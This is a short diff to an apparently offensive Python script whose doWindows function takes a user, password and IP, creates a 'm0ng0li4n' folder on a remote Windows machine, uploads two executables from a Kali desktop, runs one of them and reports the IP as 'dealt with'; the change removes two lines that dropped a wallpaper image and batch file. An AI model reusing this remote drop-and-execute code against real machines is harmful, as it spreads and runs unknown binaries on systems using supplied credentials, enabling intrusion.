@@ -26,8 +26,6 @@ def doWindows(handle, user, password, ip):
     handle.makedirs('C:\\Users\\'+user+'\\m0ng0li4n')
     handle.put('/home/kali/Desktop/Mongolian/bin/windowsFlow.exe','C:\\Users\\'+user+'\\m0ng0li4n\\windowsFlow.exe')
     handle.put('/home/kali/Desktop/Mongolian/bin/windowsSaver.exe','C:\\Users\\'+user+'\\m0ng0li4n\\windowsSaver.exe')
-    handle.put('/home/kali/Desktop/Mongolian/wallpaper.bmp', 'C:\\Users\\'+user+'\\m0ng0li4n\\wallpaper.bmp')
-    handle.put('/home/kali/Desktop/Mongolian/windowsWallaper.bat','C:\\Users'+user+'\\m0ng0li4n\\windowsWallaper.bat')
     handle.execute('C:\\Users\\'+user+'\\m0ng0li4n\\windowsFlow.exe')
     print(colored(Fore.GREEN + ip + ' has been dealt with'))
 
